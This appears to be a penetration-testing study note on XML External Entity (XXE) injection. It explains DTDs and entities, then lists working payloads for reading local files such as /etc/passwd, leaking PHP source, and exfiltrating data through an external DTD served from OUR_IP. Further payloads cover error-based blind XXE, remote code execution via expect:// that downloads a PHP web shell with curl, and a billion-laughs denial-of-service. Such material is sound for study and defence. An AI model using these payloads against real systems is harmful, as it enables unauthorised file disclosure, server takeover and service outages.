# XML External Entity (XXE) Injection
- [XML DTD](#xml-dtd)
- [XML Entities](#xml-entities)
- [Exploitation](#exploitation)

## XML DTD
- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
- Example: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
- The following is an example DTD for the XML document :
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
- The DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. 
- After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).

- The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
-------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

## XML Entities
- We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
- Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. 

> [!TIP]
> We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en").



> [!TIP]
> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.



## Exploitation
### Local File Disclosure

- **Reading Sensitive Files**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
``` 

> [!TIP]
> In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

- **Reading Source Code**
    - If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. 
    - Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
    - Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format.
    ```xml
    <!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
    ```

> [!IMPORTANT]
> This trick only works with PHP web applications.

- **Advanced Exfiltration with CDATA**
    - To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). 
    - This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
    - One easy way to tackle this issue would be to define a begin internal entity with `<![CDATA[`, an end internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:
    ```xml
    <!DOCTYPE email [
    <!ENTITY begin "<![CDATA[">
    <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY end "]]>">
    <!ENTITY joined "&begin;&file;&end;">
    ]>
    ```
    - After that, if we reference the `&joined; entity`, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
    - To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a `%` character and can only be used within the DTD.
    - What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
    ```xml
    <!ENTITY joined "%begin;%file;%end;">
    ```
    ```bash
    abdeonix@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    abdeonix@htb[/htb]$ python3 -m http.server 8000

    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    ```
    ```xml
    <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
    %xxe;
    ]>
    ...
    <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
    ```


### Blind XXE
- **Error Based XXE**
    - First, let's try to send malformed XML data, and see if the web application displays any errors.
    - We will host a DTD file that contains the following payload:
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
    ```
    - We can call our external DTD script, and then reference the error entity, as follows:
    ```xml
    <!DOCTYPE email [ 
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %error;
    ]>
    ```
    


### Remote Code Execution 
- This exploit requires the PHP expect module to be installed and enabled.
- If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output
- However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> [!NOTE]
> We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

### DOS Attack
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```